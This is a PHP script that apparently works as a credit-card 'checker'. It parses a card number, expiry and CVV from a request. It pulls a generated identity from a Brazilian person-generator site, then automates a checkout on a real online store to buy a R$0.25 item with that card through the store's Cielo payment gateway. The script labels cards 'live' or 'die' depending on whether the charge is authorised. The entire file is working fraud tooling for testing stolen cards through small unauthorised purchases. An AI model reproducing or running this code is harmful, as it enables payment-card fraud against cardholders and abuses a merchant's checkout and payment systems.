<?php
error_reporting(0);
ignore_user_abort();

function getStr($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
die('{"status":"die","lista":"null","message":"Cartao invalido, teste nao iniciado.","valor":"R$2,49"}');
}

$lista = $lista[0];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

if (strlen($mes) == 1){
  $mes = "0$mes";
}

if (strlen($ano) == 2){
  $ano = "20$ano";
}

/*if (strlen($mes) == 1){
  $mes = "0$mes";
}

if (strlen($ano) == 4){
  $ano = substr($ano, 2);
}*/

if ($cc == NULL || $mes == NULL || $ano == NULL || $cvv == NULL) {
die('{"status":"die","lista":"null","message":"Cartao invalido, teste nao iniciado.","valor":"R$2,49"}');
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
'origin: https://www.4devs.com.br',
'referer: https://www.4devs.com.br/gerador_de_pessoas',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
$dados = curl_exec($ch);
$nome = getStr($dados, '"nome":"','"' , 1);
$cpf = getStr($dados, '"cpf":"','"' , 1);
$celular = getStr($dados, '"celular":"','"' , 1);
$email = getStr($dados, '"email":"','"' , 1);
$senha = getStr($dados, '"senha":"','"' , 1);

////////////////////////////////////////////////////////////////////////////////////////////


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://reciclatec.com/index.php?route=checkout/cart/add");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: OCSESSID=6c3f6405c5f20476c98a8fea25; language=pt-br; currency=BRL',
'origin: https://reciclatec.com',
'referer: https://reciclatec.com/index.php?route=checkout/checkout',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
'x-requested-with: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'product_id=6585&quantity=1');
$produto = curl_exec($ch);


////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://reciclatec.com/index.php?route=checkout/confirm");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'cookie: OCSESSID=6c3f6405c5f20476c98a8fea25; language=pt-br; currency=BRL',
'origin: https://reciclatec.com',
'referer: https://reciclatec.com/index.php?route=checkout/checkout',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
'x-requested-with: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$confirm = curl_exec($ch);

$pedido = getStr($confirm, 'name="pedido" value="','"' , 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://reciclatec.com/index.php?route=checkout/checkout");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'cookie: OCSESSID=6c3f6405c5f20476c98a8fea25; language=pt-br; currency=BRL',
'origin: https://reciclatec.com',
'referer: https://reciclatec.com/index.php?route=checkout/checkout',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
'x-requested-with: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$checkout = curl_exec($ch);

$checkoutid = getStr($checkout, ',"reward_message":null,"checkout_id":"','"' , 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://reciclatec.com/index.php?route=journal3/checkout/save&confirm=true");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: OCSESSID=6c3f6405c5f20476c98a8fea25; language=pt-br; currency=BRL',
'origin: https://reciclatec.com',
'referer: https://reciclatec.com/index.php?route=checkout/checkout',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
'x-requested-with: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'checkout_id='.$checkoutid.'&account=register&order_data%5Bcustomer_id%5D=0&order_data%5Bcustomer_group_id%5D=1&order_data%5Bfirstname%5D=&order_data%5Blastname%5D=&order_data%5Bemail%5D='.$email.'&order_data%5Btelephone%5D=&order_data%5Bcustom_field%5D%5B2%5D='.$cpf.'&order_data%5Bcustom_field%5D%5B3%5D=2003-02-19&order_data%5Bcomment%5D=&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baddress%5D%5B0%5D%5Bcustom_field_id%5D=1&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baddress%5D%5B0%5D%5Bname%5D=N%C3%BAmero&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baddress%5D%5B0%5D%5Btype%5D=text&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baddress%5D%5B0%5D%5Bvalue%5D=&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baddress%5D%5B0%5D%5Bvalidation%5D=&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baddress%5D%5B0%5D%5Blocation%5D=address&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baddress%5D%5B0%5D%5Brequired%5D=true&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baddress%5D%5B0%5D%5Bsort_order%5D=3&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B0%5D%5Bcustom_field_id%5D=2&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B0%5D%5Bname%5D=CPF&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B0%5D%5Btype%5D=text&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B0%5D%5Bvalue%5D=&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B0%5D%5Bvalidation%5D=&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B0%5D%5Blocation%5D=account&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B0%5D%5Brequired%5D=true&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B0%5D%5Bsort_order%5D=4&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B1%5D%5Bcustom_field_id%5D=3&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B1%5D%5Bname%5D=Data+de+Nascimento&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B1%5D%5Btype%5D=date&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B1%5D%5Bvalue%5D=&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B1%5D%5Bvalidation%5D=&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B1%5D%5Blocation%5D=account&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B1%5D%5Brequired%5D=true&order_data%5Bcustom_fields%5D%5Bcustom_fields%5D%5Baccount%5D%5B1%5D%5Bsort_order%5D=5&order_data%5Bcustom_fields%5D%5Bpayment_custom_field%5D%5B1%5D=&order_data%5Bcustom_fields%5D%5Bshipping_custom_field%5D%5B1%5D=&order_data%5Btotal%5D=0.25&order_data%5Btotals%5D%5B0%5D%5Bcode%5D=sub_total&order_data%5Btotals%5D%5B0%5D%5Btitle%5D=Sub-total&order_data%5Btotals%5D%5B0%5D%5Bvalue%5D=0.25&order_data%5Btotals%5D%5B0%5D%5Bsort_order%5D=1&order_data%5Btotals%5D%5B1%5D%5Bcode%5D=shipping&order_data%5Btotals%5D%5B1%5D%5Btitle%5D=Retirar+na+empresa&order_data%5Btotals%5D%5B1%5D%5Bvalue%5D=0&order_data%5Btotals%5D%5B1%5D%5Bsort_order%5D=3&order_data%5Btotals%5D%5B2%5D%5Bcode%5D=total&order_data%5Btotals%5D%5B2%5D%5Btitle%5D=Total&order_data%5Btotals%5D%5B2%5D%5Bvalue%5D=0.25&order_data%5Btotals%5D%5B2%5D%5Bsort_order%5D=9&order_data%5Bproducts%5D%5B0%5D%5Bproduct_id%5D=6585&order_data%5Bproducts%5D%5B0%5D%5Bname%5D=ENVELOPE+PARA+CD+CORES+VARIADAS&order_data%5Bproducts%5D%5B0%5D%5Bmodel%5D=ENVELOPE+PARA+CD+CORES+VARIADAS&order_data%5Bproducts%5D%5B0%5D%5Bquantity%5D=1&order_data%5Bproducts%5D%5B0%5D%5Bsubtract%5D=1&order_data%5Bproducts%5D%5B0%5D%5Bprice%5D=0.25&order_data%5Bproducts%5D%5B0%5D%5Btotal%5D=0.25&order_data%5Bproducts%5D%5B0%5D%5Btax%5D=0&order_data%5Bproducts%5D%5B0%5D%5Bsc_qty%5D=149&order_data%5Bproducts%5D%5B0%5D%5Bstock_status%5D=Esgotado&order_data%5Bproducts%5D%5B0%5D%5Bbackorder%5D=0&order_data%5Bproducts%5D%5B0%5D%5Breward%5D=0&order_data%5Bpoints%5D=0&order_data%5Bpayment_firstname%5D=ana+gabriela&order_data%5Bpayment_lastname%5D=silva&order_data%5Bpayment_company%5D=casa&order_data%5Bpayment_address_id%5D=&order_data%5Bpayment_address_1%5D=casa+da+silva+junior&order_data%5Bpayment_address_2%5D=casa&order_data%5Bpayment_city%5D=recife&order_data%5Bpayment_postcode%5D=51150001&order_data%5Bpayment_country_id%5D=30&order_data%5Bpayment_country%5D=Brazil&order_data%5Bpayment_zone_id%5D=454&order_data%5Bpayment_zone%5D=Para%C3%ADba&order_data%5Bpayment_iso_code_2%5D=BR&order_data%5Bpayment_iso_code_3%5D=BRA&order_data%5Bpayment_address_format%5D=&order_data%5Bpayment_custom_field%5D%5B1%5D=111&order_data%5Bshipping_firstname%5D=&order_data%5Bshipping_lastname%5D=&order_data%5Bshipping_company%5D=&order_data%5Bshipping_address_id%5D=&order_data%5Bshipping_address_1%5D=&order_data%5Bshipping_address_2%5D=&order_data%5Bshipping_city%5D=&order_data%5Bshipping_postcode%5D=&order_data%5Bshipping_country_id%5D=30&order_data%5Bshipping_country%5D=Brazil&order_data%5Bshipping_zone_id%5D=454&order_data%5Bshipping_zone%5D=Para%C3%ADba&order_data%5Bshipping_iso_code_2%5D=BR&order_data%5Bshipping_iso_code_3%5D=BRA&order_data%5Bshipping_address_format%5D=&order_data%5Bshipping_custom_field%5D%5B1%5D=&order_data%5Bshipping_method%5D=Retirar+na+empresa&order_data%5Bshipping_code%5D=flat.flat&order_data%5Bpayment_method%5D=Pagar+por+PIX&order_data%5Bpayment_code%5D=cieloapipro5&password=suasenha&password2=suasenha&same_address=true&newsletter=true&privacy=false&agree=false&payment_address_type=new&shipping_address_type=new&coupon=&voucher=&reward=');
$cadastro = curl_exec($ch);

$pedido = rand(1111,9999);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://reciclatec.com/index.php?route=extension/payment/cieloapipro5/gateway");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: OCSESSID=6c3f6405c5f20476c98a8fea25; language=pt-br; currency=BRL',
'origin: https://reciclatec.com',
'referer: https://reciclatec.com/index.php?route=checkout/checkout',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
'x-requested-with: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'pedido='.$pedido.'&bandeira_cartao=mastercard&titular_cartao=gabriela+silva&cpf_cartao=90206290187&numero_cartao='.$cc.'&validade_cartao_mes='.$mes.'&validade_cartao_ano='.$ano.'&codigo_cartao='.$cvv.'&parcela_cartao=MXwxfDAuMjV8bWFzdGVyY2FyZHxjZnBwNi9lS1RZVnMy&salvar_cartao=1');
$pay = curl_exec($ch);
$link = getStr($pay, '"cupom":"','"' , 1);
$link = str_replace("\/", "/", $link);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$link");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'cookie: OCSESSID=6c3f6405c5f20476c98a8fea25; language=pt-br; currency=BRL',
'origin: https://reciclatec.com',
'referer: https://reciclatec.com/index.php?route=checkout/checkout',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
'x-requested-with: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$pay2 = curl_exec($ch);

///////////////////////////////////////////////////////////////

if(strpos($pay2, 'Pagamento Confirmado')){
die('{"status":"live","lista":"'.$lista.'","message":"Transação autorizada com sucesso. (Cielo 3.0)","valor":"R$0,25"}');
}
elseif(strpos($pay2, 'Negado')) {
die('{"status":"die","lista":"'.$lista.'","message":"Transação não autorizada. (Cielo 3.0)","valor":"R$0,25"}');
}else{
die('{"status":"die","lista":"'.$lista.'","message":"Cartão não foi testado. (Cielo 3.0)","valor":"R$0,25"}');
}
?>